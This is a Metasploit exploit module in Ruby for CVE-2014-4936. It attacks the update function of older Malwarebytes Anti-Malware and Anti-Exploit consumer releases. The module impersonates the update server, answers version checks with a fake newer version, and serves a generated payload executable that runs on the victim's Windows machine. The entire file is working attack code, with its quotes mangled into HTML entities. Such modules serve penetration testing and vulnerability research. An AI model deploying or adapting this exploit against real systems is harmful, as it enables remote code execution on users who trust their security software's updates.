# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer

  VERSION_REGEX = /\/v2\/(mbam|mbae)\/consumer\/version.chk/
  EXE_REGEX     = /\/v2\/(mbam|mbae)\/consumer\/data\/(mbam|mbae)-setup-(.*)\.exe/
  NEXT_VERSION  = { mbam: &#039;2.0.3.1025&#039;, mbae: &#039;1.04.1.1012&#039; }

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Malwarebytes Anti-Malware and Anti-Exploit Update Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the update functionality of
        Malwarebytes Anti-Malware consumer before 2.0.3 and Malwarebytes
        Anti-Exploit consumer 1.03.1.1220.
        Due to the lack of proper update package validation a man-in-the-middle
        attacker could execute arbitrary code by spoofing the update server
        data-cdn.mbamupdates.com and uploading an executable. This module has
        been tested successfully with MBAM 2.0.2.1012 and MBAE 1.03.1.1220.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Yonathan Klijnsma&#039;,  # Vulnerability discovery and PoC
          &#039;Gabor Seljan&#039;,       # Metasploit module
          &#039;todb&#039;                # Module refactoring
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-4936&#039; ],
          [&#039; OSVDB&#039;, &#039;116050&#039;],
          [ &#039;URL&#039;, &#039;http://blog.0x3a.com/post/104954032239/cve-2014-4936-malwarebytes-anti-malware-and&#039;] # Discoverer&#039;s blog
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows Universal&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Dec 16 2014&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptPort.new(&#039;SRVPORT&#039;, [ true, "The daemon port to listen on (do not change)", 80 ]),
        OptString.new(&#039;URIPATH&#039;, [ true, "The URI to use (do not change)", "/" ])
      ], self.class)

    # Vulnerable Malwarebytes clients do not allow altering these.
    deregister_options(&#039;SSL&#039;, &#039;SSLVersion&#039;, &#039;SSLCert&#039;)
  end

  def on_request_uri(cli, request)
    case request.uri
    when VERSION_REGEX
      serve_update_notice(cli) if set_exploit_target($1, request)
    when EXE_REGEX
      serve_exploit(cli)
    else
      vprint_status "Sending empty page for #{request.uri}"
      serve_default_response(cli)
    end
  end

  def serve_default_response(cli)
    send_response(cli, &#039;&#039;)
  end

  def check_client_version(request)
    return false unless request[&#039;User-Agent&#039;] =~ /base:(\d+\.\d+\.\d+\.\d+)/
    this_version = $1
    next_version = NEXT_VERSION[:mbam]
    if
      Gem::Version.new(next_version) >= Gem::Version.new(this_version)
      return true
    else
      print_error "Version #{this_version} of Anti-Malware isn&#039;t vulnerable, not attempting update."
      return false
    end
  end

  def set_exploit_target(package, request)
    case package
    when /mbam/i
      if check_client_version(request)
        @client_software = [&#039;Anti-Malware&#039;, NEXT_VERSION[:mbam]]
      else
        serve_default_response(cli)
        return false
      end
    when /mbae/i
      # We don&#039;t get identifying info from MBAE
      @client_software = [&#039;Anti-Exploit&#039;, NEXT_VERSION[:mbae]]
    end
  end

  def serve_update_notice(cli)
    software,next_version = @client_software
    print_status "Updating #{software} to (fake) #{next_version}. The user may need to click &#039;OK&#039;."
    send_response(cli, next_version,
                  &#039;Content-Type&#039; => &#039;application/octet-stream&#039;
                 )
  end

  def serve_exploit(cli)
    print_status "Sending payload EXE..."
    send_response(cli, generate_payload_exe,
                  &#039;Content-Type&#039; => &#039;application/x-msdos-program&#039;
                 )
  end

end

